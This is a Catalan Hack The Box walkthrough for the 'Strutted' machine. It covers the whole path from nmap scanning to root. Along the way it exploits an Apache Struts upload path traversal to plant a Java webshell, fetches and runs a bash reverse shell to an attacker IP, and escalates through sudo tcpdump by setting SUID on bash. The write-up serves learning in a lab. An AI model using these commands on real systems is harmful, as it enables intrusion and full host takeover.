<p align="center">
  <img src="https://github.com/user-attachments/assets/4bfec8c2-a672-4525-9acc-e837fa0246d9" alt="strutted-htb-header" width="50%" height="50%">
</p>

---
## NMAP Scanning
Escaneig a través d'enviament de paquets TCP SYN a tots els ports del host per detectar quins estan oberts.
````bash
> nmap -p- --open -sS -v -n --min-rate=5000 -Pn -n 10.10.11.59

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.63 seconds
           Raw packets sent: 74489 (3.278MB) | Rcvd: 70332 (2.813MB)
````
Amb els ports resultants de l'escaneig anterior, enumerar la versió i llençar els scripts per defecte de NMAP.
````bash
> nmap -sCV -p22,80 -Pn 10.10.11.59

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds
````
Buscant la versió de SSH al launchpad d'Ubuntu ja es pot extreure que, segurament, el host té un Ubuntu Jammy. D'altra banda, sabem que s'està aplicant Virtual Hosting i, per tant, s'ha d'afegir el domini strutted.htb a l'arxiu /etc/hosts per a que resolgui a la IP que pertoca.

## Web enumeration
La pàgina web permet la pujada d'imatges per compartir a través d'un enllaç. D'altra banda, menciona que hi ha disponible una imatge de Docker amb el mateix entorn de la web per veure de quina forma està configurat, així que ens el descarreguem i l'analitzem per poder detectar versions del software utilitzat i possibles vulnerabilitats en el codi.

![image](https://github.com/user-attachments/assets/de9807e4-cb97-43d5-b44e-b1e38b2fe753)

Un cop descarregat i descomprimit l'arxiu, hi ha diversos fitxers que són interessants a nivell d'informació. El primer és _tomcat-users.xml_, que ens permet saber que s'està utilitzant Apache Tomcat i, a més, mostra unes credencials d'accés d'administrador, que de moment no podem utilitzar enlloc.

![image](https://github.com/user-attachments/assets/0b7f4133-3437-43d6-aeb7-55704141cde3)

D'altra banda, podem observar que hi ha el fitxer _pom.xml_, un fitxer que es troba en tots els projectes de Maven i que conté tota la informació pel que fa a configuracions i dependències. D'aquest podem extreure totes les versions de les dependències utilitzades, entre les quals es troba Apache Struts 6.3.0.1, un framework pel disseny d'aplicacions web en Java.

![image](https://github.com/user-attachments/assets/dcb2cd7d-f196-4d58-b627-5f8b7723afea)

També es pot veure tota la sanitització que s'aplica a la pujada de fitxers per evitar que es pugui pujar un arxiu maliciós. En aquest cas, no només comprova que l'extensió de la imatge sigui la permesa sinó que també filtra segons el Content-Type i els _magic bytes_ per a impedir la manipulació d'imatges. Per tant, de moment no s'hi pot fer gran cosa.

![image](https://github.com/user-attachments/assets/bae76798-13ae-4475-b714-40fdf76b3722)

## Initial foothold
Si busquem la versió d'Apache Struts trobem que té una vulnerabilitat crítica de Path Traversal associada, que afecta a la pujada de fitxes a través de la manipulació de paràmetres dels interceptors. Els interceptors són funcionalitats que poden executar codi abans o després d'invocar una acció (en aquest cas, la pujada d'un arxiu). 

En concret, la vulnerabilitat es troba en _top.UploadFileName_, que permet el canvi de nom d'un fitxer un cop pujat i, per tant, saltant-nos totes les regles definides en el backend de la web. A més, el nom del fitxer permet la inclusió de "../../..", permetent el Path Traversal. Així doncs, podem pujar un fitxer arbitrari amb codi Java per executar comandes de forma remota, i el podem col·locar com si fos un directori més de la pàgina per poder accedir-hi.

![image](https://github.com/user-attachments/assets/232d4f5b-37b2-4fbf-98c1-b5beb54d9e2e)

> És important que el fitxer que es pugi inicialment tingui la forma d'una imatge. Per tant, sense comptar el codi de la webshell de Java, la resta de camps (extensió inicial, content-type i magic bytes) han de correspondre als d'una imatge.

Com hem vist a la petició anterior, hem creat un arxiu amb una webshell en Java a la que podem accedir pel directori _/shell i executar comandes. Podem també, doncs, establir una consola interactiva com l'usuari que corre el servei web: tomcat.

![image](https://github.com/user-attachments/assets/17a088e8-53cf-4906-8308-9877b5d48ea4)

Es pot fer de diverses maneres, sent una de les més simples crear a la màquina atacant una reverse shell i transferint-la a la víctima mitjançant HTTP per després executar-la.
````bash
# Màquina atacant
> echo "bash -i >& /dev/tcp/10.10.16.68/4321 0>&1" > revshell.sh
> python3 -m http.server 8008

# Màquina víctima
[...]&cmd=curl http://10.10.16.68:8008/revshell.sh -o /tmp/revshell.sh
[...]&cmd=chmod +x /tmp/revshell.sh
[...]&cmd=bash /tmp/revshell.sh
````
![image](https://github.com/user-attachments/assets/7a725ab0-a2b7-415f-a3b1-e7ca15f64c07)

I tenim una consola amb l'usuari _tomcat_.

## User
Veient el _/etc/passwd_, trobem dos altres usuaris al host: _james_ i _root_.
````bash
> cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:Network Administrator:/home/james:/bin/bash
````
Si recordem l'estructura que tenia la web en el comprimit descarregat al principi, hi havia un arxiu on hi havia credencials anomenat _tomcat-users.xml_. Tot i que la contrasenya d'aquell arxiu no era correcta, el host en té una diferent que potser correspon a la de l'usuari _james_. Si provem a loguejar-nos com aquest usuari amb la contrasenya trobada, no ho aconseguirem.

![image](https://github.com/user-attachments/assets/ea2fd473-d240-4bd2-a36d-e352419b4d86)
![image](https://github.com/user-attachments/assets/f1491ec7-7efe-44f7-bfc8-63f52d2f93dd)

Tanmateix, si provem a iniciar sessió a través de SSH, sí que podrem.

![image](https://github.com/user-attachments/assets/26193c8f-0977-4ca1-a532-8f41cd5e526f)

> Això es possible gràcies a que a l'arxiu de configuració del servei de Tomcat hi ha assignat "NoNewPrivileges=true", motiu pel qual no podem convertir-nos en cap usuari des de l'usuari tomcat.
## Privilege escalation
Si mirem els permisos que té l'usuari _james_ a nivell d'executar comandes amb privilegis, trobem que pot executar el binari _TCPdump_ amb privilegis de root.
````bash
> sudo -l

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
````
[GTFOBins](https://gtfobins.github.io/) té una col·lecció de peces de codi per escalar privilegis utilitzant certs binaris i amb certes condicions (sudo, suid...). Entre aquestes, es troba l'escalada mitjançant l'execució privilegiada de comandes a través de _TCPdump_ de la següent manera.
````bash
COMMAND=''
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
````
Si 'COMMAND=chmod +s /bin/bash', assignem el bit SUID a la consola bash, amb lo qual podrem establir-nos una consola privilegiada amb "bash -p".

![image](https://github.com/user-attachments/assets/3c876931-eb45-43d7-af70-d126adca5b2e)

I ja som root al host.
